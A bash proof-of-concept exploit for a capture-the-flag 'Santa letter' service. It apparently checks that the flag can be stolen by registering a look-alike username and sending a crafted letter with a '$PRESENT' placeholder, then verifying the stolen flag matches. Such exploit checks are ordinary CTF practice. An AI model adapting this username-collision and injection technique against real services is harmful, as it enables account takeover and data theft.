#!/bin/bash

# Useful functions
function random()
{
  echo -n "$(tr -dc _A-Za-z0-9 < /dev/urandom | head -c ${1:-32})"
}
function recv()
{
  RECEIVED=""
  while read -t 0.2 ret; do
    RECEIVED="${RECEIVED}${ret}"$'\n'
  done
}
function sr()
{
  echo "$1"
  recv
}
function execute()
{
  FIFO=$(mktemp -u /tmp/poc_$$_XXXXXX )
  mkfifo $FIFO
  ( : <$FIFO & )    # avoid deadlock on opening pipe
  exec 4<&0 5>&1    # Save previous fd
  exec > >($SANTA>$FIFO) <$FIFO # Create the loop of communication
  local p=$1
  shift
  $p $*
  while read;do continue;done          # Flush FIFO
  exec 0<&4- 1>&5-    # restore previous fd
  rm $FIFO
}

# Actions functions
function register()
{
  recv
  sr "R"
  sr "$1 $2"
}
function set_flag()
{
  recv
  sr "L"
  sr "$1 $2"
  sr "W"
  cat <<EOF
Dear Santa,
I'd like a $3.
Love,
$1

EOF
}
function write_letter()
{
  recv
  sr "L"
  sr "$1 $2"
  sr "W"
  local nicer=''
  local letter=$'\n'     # nice.bash on empty letter fails
  while ! { echo -n "$letter" | ../ro/nice.bash; }; do
    letter=$(cat <<EOF
Dear $3,
\$PRESENT
3
4
5
6
7$nicer
Love,
Santa
$1
EOF
)
    nicer="A$nicer"
  done
  sr "$letter"
}
function read_response()
{
  recv
  sr "L"
  sr "$1 $2"
  echo "R"
  recv
  local ret     # Retrieve flag (the 3rd line)
  { read;read;read ret; } <<< "$RECEIVED"
  echo -n "$ret" >&5
}


if [ $# -ne 1 ]; then
  echo "usage: ${0##*/} path_to_santamachine"
  exit 1
fi

pushd "${0%/*}/../rw" > /dev/null

SANTA="${1}"


# SetFlag
login="$(random 10)"
pass="$(random 20)"
flag="FLG$(random 13)"

echo "Create user $login:$pass"
execute "register" $login $pass
echo "Set flag $flag"
execute "set_flag" $login $pass $flag

# Exploit
echo; echo "Start exploit"
echo "Compute exploit username"

tmp="$login"
declare -a e_login=()
len=$(( ${#tmp} - 1 ))
while [ $len -ge 0 ]; do
  if [ ${tmp:$len:1} != 'z' ]; then
    tmp="${tmp:0:$len}z${tmp:$len+1}"
    e_login=( "${e_login[@]}" "$tmp" )
    [ ${#e_login[@]} -eq  2 ] && break
  fi
  (( len-- ))
done
if [[ ${#e_login[@]} -lt 2 ]]; then
  echo "User couldn't be exploited" && exit 2
fi
echo "Exploit user will be ${e_login[1]}"

e_pass="$(random 20)"
echo;echo "Register exploit user"
execute "register" ${e_login[1]} $e_pass

echo "Send exploit letter"
execute "write_letter" ${e_login[1]} $e_pass ${e_login[0]}

echo "Read response"
e_flag="$(execute "read_response" ${e_login[1]} $e_pass)"
echo "The stolen flag is ${e_flag}"
echo -n "Flags match? "
[ "$e_flag" == "$flag" ] && echo -e "\x1b[32m✓\x1b[0m" || \
  echo -e "\x1b[31m✗\x1b[0m"


popd > /dev/null
